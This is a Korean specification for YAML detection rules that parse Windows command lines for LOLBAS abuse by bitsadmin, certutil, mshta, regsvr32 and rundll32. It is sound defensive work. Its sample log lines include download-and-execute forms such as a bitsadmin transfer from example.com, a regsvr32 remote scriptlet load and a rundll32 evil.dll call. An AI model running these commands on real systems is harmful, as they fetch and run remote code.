# guide.v2.md

## 문서 목적

본 문서는 **Windows LOLBAS CommandLine Parsing Rule Specification v2** 문서입니다.
즉, 보안 담당자가 관리하는 **YAML 룰 정의 표준**과 **운영용 최종 패턴 v2**를 정리하는 문서입니다.

이 문서는 구현 문서가 아니라 **룰 정의 문서**입니다.
ETL/backend 구현, YAML 해석 방식, 후처리 함수 실제 동작, 정규화 결과 저장 방식은
별도 문서인 **`guide-etl.v2.md`** 에서 관리합니다.

## 문서 관계

- `guide.v2.md`: 보안 담당자 관점의 룰 정의, 필드 규격, 패턴 작성 기준, 운영용 YAML
- `guide-etl.v2.md`: ETL/backend 관점의 YAML 로딩, trigger 평가, parser 적용, post_process 해석, 정규화 저장

따라서 본 문서에서 등장하는 아래 항목은 **선언형 규격**으로 이해합니다.

- `trigger`
- `target_field`
- `parser.pattern`
- `output`
- `post_process`
- `severity`
- `tags`

전제는 다음입니다.

* **backend 는 하드코딩**
* **보안 담당자는 YAML 만 관리**
* backend 는 YAML 을 읽어서

  * 트리거 평가
  * 대상 필드 선택
  * regex 파싱
  * 결과 필드 추출
  * 후처리
    를 수행

즉, 구현 구조는 아래입니다.

```text
Windows Event Log / Sysmon / EDR Event
→ backend parser engine
→ YAML rule load
→ trigger match
→ target_field(CommandLine) parse
→ extracted fields 저장
```

---

# 1. 운영용 v2 설계 원칙

이번 v2에서 중요한 점은 **Windows CommandLine의 인용부호 처리**입니다.

실제 로그는 아래처럼 매우 다양합니다.

```text
bitsadmin /transfer myjob http://example.com/a.exe C:\temp\a.exe
```

```text
bitsadmin /transfer myjob "http://example.com/a.exe" "C:\temp\a.exe"
```

```text
"C:\Windows\System32\bitsadmin.exe" /transfer myjob "http://example.com/a.exe" "C:\temp\a.exe"
```

```text
"C:\Windows\System32\rundll32.exe" "C:\temp\evil.dll",EntryPoint
```

```text
regsvr32.exe /s /n /u /i:"http://example.com/test.sct" scrobj.dll
```

그래서 v2는 다음을 기준으로 작성합니다.

* 실행 파일 경로가 따옴표로 감싸져도 대응
* URL/경로 인자가 따옴표로 감싸져도 대응
* 비인용/인용 혼합 형태 대응
* 실무상 가장 흔한 LOLBAS 변형 우선 대응
* 너무 복잡한 만능 정규식보다 **행위별 안정 패턴 분리**

---

# 2. YAML 공통 스키마 v2

아래 스키마는 **보안 담당자가 관리하는 선언형 룰 형식**입니다.
이 스키마의 해석과 실행 책임은 `guide-etl.v2.md` 에 정의된 ETL/backend 영역에 있습니다.

```yaml
version: 2

metadata:
  name: windows-lolbas-commandline-parser
  description: Operational LOLBAS parsing rules for Windows CommandLine
  owner: security-team
  target_platform: windows

defaults:
  target_field: CommandLine
  parser_type: regex
  case_insensitive: true

rules: []
```

각 룰 구조:

```yaml
- id: 고유ID
  name: 룰명
  status: enabled
  description: 설명
  lolbas: bitsadmin
  category: file_download

  log_source:
    product: windows
    service: security
    event_id:
      - 4688

  trigger:
    image:
      endswith:
        - '\bitsadmin.exe'
    commandline:
      contains:
        - '/transfer'

  target_field: CommandLine

  parser:
    type: regex
    pattern: '...'

  output:
    - field1
    - field2

  post_process:
    - normalize_windows_path
    - detect_remote_url

  tags:
    - lolbas
    - bitsadmin

  severity: high
```

---

# 3. 운영용 최종 패턴 v2 YAML

아래는 바로 관리 가능한 **운영용 예시 전체본**입니다.

```yaml
version: 2

metadata:
  name: windows-lolbas-commandline-parser
  description: Operational LOLBAS parsing rules for Windows CommandLine with quoted argument support
  owner: security-team
  target_platform: windows

defaults:
  target_field: CommandLine
  parser_type: regex
  case_insensitive: true

rules:
  - id: LOLBAS_BITSADMIN_TRANSFER_V2
    name: bitsadmin transfer extract v2
    status: enabled
    description: Extract job name, remote source, and local destination from bitsadmin /transfer command line with quoted argument support
    lolbas: bitsadmin
    category: file_download

    log_source:
      product: windows
      service: security
      event_id:
        - 4688
        - 1

    trigger:
      image:
        endswith:
          - '\bitsadmin.exe'
      commandline:
        contains:
          - '/transfer'

    target_field: CommandLine

    parser:
      type: regex
      pattern: '(?ix)
        ^\s*
        (?:
          "(?<image_quoted>[^"]*bitsadmin(?:\.exe)?)"
          |
          (?<image_plain>\S*bitsadmin(?:\.exe)?)
        )?
        \s*
        /transfer
        \s+
        (?:
          "(?<job_name_q>[^"]+)"
          |
          (?<job_name>\S+)
        )
        \s+
        (?:
          "(?<remote_src_q>[^"]+)"
          |
          (?<remote_src>\S+)
        )
        \s+
        (?:
          "(?<local_dst_q>[^"]+)"
          |
          (?<local_dst>.+?)
        )
        \s*$
      '

    output:
      - image_quoted
      - image_plain
      - job_name_q
      - job_name
      - remote_src_q
      - remote_src
      - local_dst_q
      - local_dst

    post_process:
      - coalesce:image=image_quoted,image_plain
      - coalesce:job_name=job_name_q,job_name
      - coalesce:remote_src=remote_src_q,remote_src
      - coalesce:local_dst=local_dst_q,local_dst
      - normalize_windows_path:local_dst
      - detect_remote_url:remote_src
      - detect_ads:remote_src
      - detect_script_extension:local_dst

    tags:
      - lolbas
      - bitsadmin
      - transfer
      - download

    severity: high

  - id: LOLBAS_CERTUTIL_URLCACHE_V2
    name: certutil urlcache extract v2
    status: enabled
    description: Extract remote source and local destination from certutil -urlcache command line with quoted argument support
    lolbas: certutil
    category: file_download

    log_source:
      product: windows
      service: security
      event_id:
        - 4688
        - 1

    trigger:
      image:
        endswith:
          - '\certutil.exe'
      commandline:
        contains:
          - '-urlcache'

    target_field: CommandLine

    parser:
      type: regex
      pattern: '(?ix)
        ^\s*
        (?:
          "(?<image_quoted>[^"]*certutil(?:\.exe)?)"
          |
          (?<image_plain>\S*certutil(?:\.exe)?)
        )?
        \s*
        (?<raw_prefix>.*?-urlcache.*?-f)
        \s+
        (?:
          "(?<remote_src_q>[^"]+)"
          |
          (?<remote_src>\S+)
        )
        \s+
        (?:
          "(?<local_dst_q>[^"]+)"
          |
          (?<local_dst>.+?)
        )
        \s*$
      '

    output:
      - image_quoted
      - image_plain
      - raw_prefix
      - remote_src_q
      - remote_src
      - local_dst_q
      - local_dst

    post_process:
      - coalesce:image=image_quoted,image_plain
      - trim:raw_prefix
      - coalesce:remote_src=remote_src_q,remote_src
      - coalesce:local_dst=local_dst_q,local_dst
      - normalize_windows_path:local_dst
      - detect_remote_url:remote_src
      - detect_script_extension:local_dst

    tags:
      - lolbas
      - certutil
      - urlcache
      - download

    severity: high

  - id: LOLBAS_CERTUTIL_DECODE_V2
    name: certutil decode extract v2
    status: enabled
    description: Extract source path and destination path from certutil decode command line with quoted argument support
    lolbas: certutil
    category: file_transform

    log_source:
      product: windows
      service: security
      event_id:
        - 4688
        - 1

    trigger:
      image:
        endswith:
          - '\certutil.exe'
      commandline:
        contains:
          - '-decode'

    target_field: CommandLine

    parser:
      type: regex
      pattern: '(?ix)
        ^\s*
        (?:
          "(?<image_quoted>[^"]*certutil(?:\.exe)?)"
          |
          (?<image_plain>\S*certutil(?:\.exe)?)
        )?
        \s*
        (?<lolbas_action>-(?:decode|decodehex|encode|encodehex))
        \s+
        (?:
          "(?<src_path_q>[^"]+)"
          |
          (?<src_path>\S+)
        )
        \s+
        (?:
          "(?<local_dst_q>[^"]+)"
          |
          (?<local_dst>.+?)
        )
        \s*$
      '

    output:
      - image_quoted
      - image_plain
      - lolbas_action
      - src_path_q
      - src_path
      - local_dst_q
      - local_dst

    post_process:
      - coalesce:image=image_quoted,image_plain
      - coalesce:src_path=src_path_q,src_path
      - coalesce:local_dst=local_dst_q,local_dst
      - normalize_windows_path:src_path
      - normalize_windows_path:local_dst
      - detect_script_extension:local_dst

    tags:
      - lolbas
      - certutil
      - decode
      - encode

    severity: medium

  - id: LOLBAS_MSHTA_TARGET_V2
    name: mshta target extract v2
    status: enabled
    description: Extract target path or script scheme from mshta command line with quoted argument support
    lolbas: mshta
    category: script_execution

    log_source:
      product: windows
      service: security
      event_id:
        - 4688
        - 1

    trigger:
      image:
        endswith:
          - '\mshta.exe'

    target_field: CommandLine

    parser:
      type: regex
      pattern: '(?ix)
        ^\s*
        (?:
          "(?<image_quoted>[^"]*mshta(?:\.exe)?)"
          |
          (?<image_plain>\S*mshta(?:\.exe)?)
        )
        \s+
        (?:
          "(?<target_path_q>[^"]+)"
          |
          (?<target_path>.+)
        )
        \s*$
      '

    output:
      - image_quoted
      - image_plain
      - target_path_q
      - target_path

    post_process:
      - coalesce:image=image_quoted,image_plain
      - coalesce:target_path=target_path_q,target_path
      - detect_remote_url:target_path
      - detect_script_scheme:target_path
      - detect_script_extension:target_path
      - normalize_windows_path:target_path

    tags:
      - lolbas
      - mshta
      - script
      - hta

    severity: high

  - id: LOLBAS_REGSVR32_REMOTE_SCT_V2
    name: regsvr32 remote sct extract v2
    status: enabled
    description: Extract remote source from /i: and DLL target from regsvr32 command line with quoted argument support
    lolbas: regsvr32
    category: remote_scriptlet

    log_source:
      product: windows
      service: security
      event_id:
        - 4688
        - 1

    trigger:
      image:
        endswith:
          - '\regsvr32.exe'
      commandline:
        contains:
          - '/i:'

    target_field: CommandLine

    parser:
      type: regex
      pattern: '(?ix)
        ^\s*
        (?:
          "(?<image_quoted>[^"]*regsvr32(?:\.exe)?)"
          |
          (?<image_plain>\S*regsvr32(?:\.exe)?)
        )
        \s+
        (?<raw_prefix>.*?)
        /i:
        (?:
          "(?<remote_src_q>[^"]+)"
          |
          (?<remote_src>\S+)
        )
        \s+
        (?:
          "(?<dll_path_q>[^"]+)"
          |
          (?<dll_path>\S+)
        )
        \s*$
      '

    output:
      - image_quoted
      - image_plain
      - raw_prefix
      - remote_src_q
      - remote_src
      - dll_path_q
      - dll_path

    post_process:
      - coalesce:image=image_quoted,image_plain
      - trim:raw_prefix
      - coalesce:remote_src=remote_src_q,remote_src
      - coalesce:dll_path=dll_path_q,dll_path
      - detect_remote_url:remote_src
      - detect_sct:remote_src
      - normalize_windows_path:dll_path

    tags:
      - lolbas
      - regsvr32
      - remote
      - sct

    severity: high

  - id: LOLBAS_REGSVR32_DLL_V2
    name: regsvr32 dll extract v2
    status: enabled
    description: Extract local DLL path from regsvr32 command line with quoted argument support
    lolbas: regsvr32
    category: dll_registration

    log_source:
      product: windows
      service: security
      event_id:
        - 4688
        - 1

    trigger:
      image:
        endswith:
          - '\regsvr32.exe'

    target_field: CommandLine

    parser:
      type: regex
      pattern: '(?ix)
        ^\s*
        (?:
          "(?<image_quoted>[^"]*regsvr32(?:\.exe)?)"
          |
          (?<image_plain>\S*regsvr32(?:\.exe)?)
        )
        \s+
        (?<raw_prefix>.*?)
        (?:
          "(?<dll_path_q>[A-Za-z]:\\[^"]+?\.dll)"
          |
          (?<dll_path>[A-Za-z]:\\.*?\.dll)
        )
        \s*$
      '

    output:
      - image_quoted
      - image_plain
      - raw_prefix
      - dll_path_q
      - dll_path

    post_process:
      - coalesce:image=image_quoted,image_plain
      - trim:raw_prefix
      - coalesce:dll_path=dll_path_q,dll_path
      - normalize_windows_path:dll_path

    tags:
      - lolbas
      - regsvr32
      - dll

    severity: medium

  - id: LOLBAS_RUNDLL32_DLL_EXPORT_V2
    name: rundll32 dll export extract v2
    status: enabled
    description: Extract DLL path, export function, and additional arguments from rundll32 command line with quoted argument support
    lolbas: rundll32
    category: dll_execution

    log_source:
      product: windows
      service: security
      event_id:
        - 4688
        - 1

    trigger:
      image:
        endswith:
          - '\rundll32.exe'

    target_field: CommandLine

    parser:
      type: regex
      pattern: '(?ix)
        ^\s*
        (?:
          "(?<image_quoted>[^"]*rundll32(?:\.exe)?)"
          |
          (?<image_plain>\S*rundll32(?:\.exe)?)
        )
        \s+
        (?:
          "(?<dll_path_q>[^"]+)"
          |
          (?<dll_path>[^,\s]+)
        )
        ,
        (?<export_func>[^\s,"]+)
        (?:
          \s+
          (?<raw_args>.*)
        )?
        \s*$
      '

    output:
      - image_quoted
      - image_plain
      - dll_path_q
      - dll_path
      - export_func
      - raw_args

    post_process:
      - coalesce:image=image_quoted,image_plain
      - coalesce:dll_path=dll_path_q,dll_path
      - normalize_windows_path:dll_path
      - trim:raw_args
      - detect_script_scheme:raw_args

    tags:
      - lolbas
      - rundll32
      - dll
      - export

    severity: high

  - id: LOLBAS_RUNDLL32_SCRIPT_SCHEME_V2
    name: rundll32 script scheme extract v2
    status: enabled
    description: Extract javascript or vbscript execution payload from rundll32 command line
    lolbas: rundll32
    category: script_execution

    log_source:
      product: windows
      service: security
      event_id:
        - 4688
        - 1

    trigger:
      image:
        endswith:
          - '\rundll32.exe'
      commandline:
        regex:
          - '(?i)\b(?:javascript|vbscript):'

    target_field: CommandLine

    parser:
      type: regex
      pattern: '(?ix)
        ^\s*
        (?:
          "(?<image_quoted>[^"]*rundll32(?:\.exe)?)"
          |
          (?<image_plain>\S*rundll32(?:\.exe)?)
        )
        \s+
        (?<script_path>.*?(?:javascript|vbscript):.+)
        \s*$
      '

    output:
      - image_quoted
      - image_plain
      - script_path

    post_process:
      - coalesce:image=image_quoted,image_plain
      - trim:script_path
      - detect_script_scheme:script_path
      - detect_remote_url:script_path

    tags:
      - lolbas
      - rundll32
      - javascript
      - vbscript

    severity: high
```

---

# 4. 이 v2의 핵심 개선점

기존 v1과 비교해 v2는 아래가 다릅니다.

## 4-1. 실행 파일 자체가 따옴표여도 대응

예:

```text
"C:\Windows\System32\bitsadmin.exe" /transfer ...
```

이를 위해 패턴 앞부분을 모두 아래 구조로 통일했습니다.

```regex
(?:
  "(?<image_quoted>[^"]*bitsadmin(?:\.exe)?)"
  |
  (?<image_plain>\S*bitsadmin(?:\.exe)?)
)?
```

---

## 4-2. 인자 따옴표 처리

예:

```text
bitsadmin /transfer myjob "http://example.com/a.exe" "C:\temp\a.exe"
```

이를 위해 각 핵심 인자를 아래처럼 처리했습니다.

```regex
(?:
  "(?<remote_src_q>[^"]+)"
  |
  (?<remote_src>\S+)
)
```

즉, quoted / unquoted 둘 다 받습니다.

---

## 4-3. backend 후처리 전제

YAML 은 추출만 정의하고, backend 는 **coalesce** 로 최종 필드를 합칩니다.

예:

```yaml
post_process:
  - coalesce:remote_src=remote_src_q,remote_src
```

의미:

* `remote_src_q` 값이 있으면 그 값을 `remote_src` 로 사용
* 없으면 `remote_src` 원본 사용

이 구조가 있어야 YAML 이 깔끔해집니다.

---

# 5. ETL/backend 필수 지원 항목

보안 담당자가 YAML 만 관리하려면, ETL/backend 는 아래 항목을 공통 기능으로 지원해야 합니다.
세부 동작 계약, 예외 처리, 실행 순서, 오류 정책은 `guide-etl.v2.md` 에서 관리합니다.

## 5-1. trigger evaluator

```text
image.endswith
commandline.contains
commandline.regex
event_id match
```

## 5-2. regex parser

* PCRE 호환 또는 .NET Regex 호환
* named capture group 지원
* `(?i)` `(?x)` 지원

## 5-3. post_process 함수

최소 아래 정도는 backend 가 내장 제공 권장입니다.

```text
coalesce
trim
normalize_windows_path
detect_remote_url
detect_ads
detect_script_extension
detect_script_scheme
detect_sct
```

---

# 6. ETL/backend 정규화 결과 예시

입력 로그:

```text
"C:\Windows\System32\bitsadmin.exe" /transfer "mydownload" "http://example.com/download.log:evil.vbs" "C:\temp\local.vbs"
```

추출 후 최종 normalized result:

```json
{
  "rule_id": "LOLBAS_BITSADMIN_TRANSFER_V2",
  "lolbas": "bitsadmin",
  "image": "C:\\Windows\\System32\\bitsadmin.exe",
  "job_name": "mydownload",
  "remote_src": "http://example.com/download.log:evil.vbs",
  "local_dst": "C:\\temp\\local.vbs",
  "is_remote_url": true,
  "has_ads": true,
  "script_extension": ".vbs",
  "severity": "high"
}
```

---

# 7. 운영 시 권장 사항

## 7-1. 하나의 만능 regex로 끝내지 않기

실무에서는 `rundll32`, `mshta`, `regsvr32` 변형이 많기 때문에
지금처럼 **행위별 룰 분리**가 훨씬 안정적입니다.

## 7-2. image 트리거 + commandline 파싱 분리

* 트리거: `Image`, `NewProcessName`
* 파싱: `CommandLine`

이렇게 나누면 오탐과 성능이 좋아집니다.

## 7-3. YAML 은 선언만, 해석은 backend

YAML 에서 계산 로직까지 넣기 시작하면 관리가 어려워집니다.
YAML 은 아래만 담당하게 두는 것이 좋습니다.

* 어떤 이벤트를 볼지
* 어느 필드를 파싱할지
* 어떤 정규식을 적용할지
* 어떤 값을 추출할지

---

# 8. 추천 디렉터리 구조

```text
rules/
  lolbas/
    bitsadmin.yml
    certutil.yml
    mshta.yml
    regsvr32.yml
    rundll32.yml
  bundles/
    windows_lolbas_v2.yml
```

운영 방식은 보통 둘 중 하나입니다.

## 방식 A

* 파일별 관리
* 배포 시 병합

## 방식 B

* 한 파일에 전체 관리

초기에는 **한 파일**이 단순하고,
규모가 커지면 **파일 분리**가 좋습니다.

---

# 9. 보안 담당자용 관리 포인트

보안 담당자는 주로 아래만 보면 됩니다.

* `trigger`
* `pattern`
* `output`
* `severity`
* `tags`

즉, backend 코드 수정 없이도

* LOLBAS 추가
* 패턴 보완
* 오탐 줄이기
* 추출 필드 확대

가 가능합니다.

---

# 10. 최종 정리

## 구조

* security team: `guide.v2.md` 기준으로 YAML 룰 관리
* ETL/backend team: `guide-etl.v2.md` 기준으로 YAML 해석 및 처리 엔진 관리

## guide.v2.md 에서 관리하는 내용

* 트리거 정의
* 대상 필드 정의
* quoted/unquoted 대응 regex
* 추출 필드 정의
* 후처리 키워드 선언
* 위험도 및 태그

## guide-etl.v2.md 에서 관리하는 내용

* YAML 로딩 방식
* trigger 평가 순서
* parser 적용 규칙
* post_process 해석 규칙
* 정규화 결과 스키마
* 오류 처리 및 예외 정책

## 이번 v2 목적

* **Windows CommandLine 인용부호 포함 형태까지 운영 수준으로 대응**
* **룰 정의와 ETL 구현 문서를 분리하여 운영 책임을 명확히 구분**
